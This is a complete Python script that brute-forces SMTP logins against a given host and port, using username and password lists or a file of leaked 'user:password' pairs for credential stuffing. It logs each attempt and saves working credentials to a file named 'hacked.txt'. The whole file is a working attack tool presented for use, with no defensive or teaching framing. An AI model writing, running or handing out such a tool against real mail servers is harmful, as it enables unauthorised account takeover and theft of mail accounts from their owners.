#!/usr/bin/env python3
import os
from smtplib import SMTP

DEFAULT_OUTPUT_FILE = 'hacked.txt'
DEFAULT_USED_CREDENTIALS_FILE = 'used-credentials.txt'


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--host',
                        dest='host',
                        required=True,
                        help='An IP address of the service to connect to')
    parser.add_argument('--port',
                        dest='port',
                        required=True,
                        help='A TCP port of the service to connect to')
    parser.add_argument('--smtp',
                        action='store_true',
                        required=False,
                        help='Pass this argument to bruteforce an SMTP service '
                             'located on the specified --host and --port.')
    parser.add_argument('--user',
                        dest='user',
                        required=False,
                        help='A username to check against the given service')
    parser.add_argument('--user-file',
                        dest='user_file',
                        required=False,
                        help='A txt file with a new-line separated list of the usernames to enumerate against the '
                             'given service')
    parser.add_argument('--password',
                        dest='password',
                        required=False,
                        help='A password to check against the given service')
    parser.add_argument('--password-file',
                        dest='password_file',
                        required=False,
                        help='A txt file with a new-line separated list of the passwords to enumerate against the '
                             'given service')
    parser.add_argument('--leak',
                        dest='leak',
                        required=False,
                        help='A txt file with a new-line separated list of credentials to check, '
                             'in the following format - user:password')
    parser.add_argument('--keep',
                        action='store_true',
                        default=False,
                        required=False,
                        help='Keep trying to bruteforce the service '
                             'even if valid credentials are found. Default is False')
    parser.add_argument("-o",
                        "--output",
                        dest='output',
                        default=DEFAULT_OUTPUT_FILE,
                        required=False,
                        help='An output file with valid credentials. Default is ' + DEFAULT_OUTPUT_FILE)
    options = parser.parse_args()
    if not options.leak and not options.user and not options.user_file:
        parser.error('You have to give a username or a file with usernames to check, '
                     'use --help for more info')
    if not options.leak and not options.password and not options.password_file:
        parser.error('You have to give a password or a file with passwords to check, '
                     'use --help for more info')
    if not options.smtp:
        parser.error('You have to give a service name to bruteforce. Use --help for more info')
    return options


def is_used_credentials(username, password,
                        used_credentials_file=DEFAULT_USED_CREDENTIALS_FILE):
    with open(used_credentials_file, 'r') as f:
        for line in f.readlines():
            creds = f'{username}:{password}'
            if creds == line.strip():
                print(f'{creds} has already been used')
                return True


def write_to_used_credentials_file(username, password,
                                   used_credentials_file=DEFAULT_USED_CREDENTIALS_FILE):
    with open(used_credentials_file, 'a') as f:
        creds = f'{username}:{password}'
        f.write(creds)
        f.write(os.linesep)


def do_smtp_login(smtp_host, smtp_port, username, password):
    with SMTP(host=smtp_host, port=smtp_port) as smtp:
        smtp.starttls()
        print(f"ATTEMPT - {username}:{password}")
        try:
            is_logged_in = smtp.login(user=username, password=password)
            if is_logged_in:
                return True
        except Exception as e:
            pass


options = get_arguments()

host = options.host
port = options.port
output_file = options.output
is_bruteforce_after_valid_credentials_are_found = options.keep

usernames = set()
passwords = set()

if options.user:
    usernames.add(options.user)
if options.user_file:
    user_file_path = options.user_file
    if os.path.exists(user_file_path):
        with open(user_file_path, 'r') as user_file:
            for line in [l.strip() for l in user_file.readlines()]:
                usernames.add(line)
    else:
        print(f"{user_file_path} - no such file or directory")

if options.password:
    passwords.add(options.password)
if options.password_file:
    password_file_path = options.password_file
    if os.path.exists(password_file_path):
        with open(password_file_path, 'r') as password_file:
            for line in [l.strip() for l in password_file.readlines()]:
                passwords.add(line)
    else:
        print(f"{password_file_path} - no such file or directory")

leak_file_path = options.leak
leak_file_credentials = set()
if leak_file_path:
    if os.path.exists(leak_file_path):
        with open(leak_file_path, 'r') as leak_file:
            for line in [l.strip() for l in leak_file.readlines()]:
                if ':' in line:
                    leak_file_credentials.add(line)
                else:
                    print(f"Skipping malformed line: {line}")
                    continue
    else:
        print(leak_file_path + " - no such file or directory")

if leak_file_path:
    for line in leak_file_credentials:
        username = line.split(":")[0]
        password = line.split(":")[1]
        if '@' in username:
            username = username.split('@')[0]
        if is_used_credentials(username, password):
            continue

        hacked = False
        if options.smtp:
            hacked = do_smtp_login(smtp_host=host,
                                   smtp_port=port,
                                   username=username,
                                   password=password)
            write_to_used_credentials_file(username, password)
        if hacked:
            creds = f"{username}:{password}"
            print(f'SUCCESS - {creds}')
            with open(output_file, 'a') as f:
                f.write(creds)
                f.write(os.linesep)
            if is_bruteforce_after_valid_credentials_are_found:
                continue
            else:
                exit()
else:
    for username in usernames:
        for password in passwords:
            if '@' in username:
                username = username.split('@')[0]
            if is_used_credentials(username, password):
                continue

            hacked = False
            if options.smtp:
                hacked = do_smtp_login(smtp_host=host,
                                       smtp_port=port,
                                       username=username,
                                       password=password)
                write_to_used_credentials_file(username, password)
            if hacked:
                creds = f"{username}:{password}"
                print(f'SUCCESS - {creds}')
                with open(output_file, 'a') as f:
                    f.write(creds)
                    f.write(os.linesep)
                if is_bruteforce_after_valid_credentials_are_found:
                    continue
                else:
                    exit()
